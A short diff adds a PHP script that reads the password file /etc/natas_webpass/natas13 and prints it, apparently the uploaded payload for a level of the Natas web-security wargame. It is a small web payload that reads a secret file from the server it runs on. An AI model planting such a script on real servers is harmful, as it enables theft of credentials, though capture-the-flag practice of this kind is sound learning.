@@ -1,0 +1,10 @@
+<?php
+$filename = '/etc/natas_webpass/natas13';
+
+if (file_exists($filename)) {
+    // Read the file and output its contents
+    echo nl2br(htmlspecialchars(file_get_contents($filename)));
+} else {
+    echo "File not found.";
+}
+?>
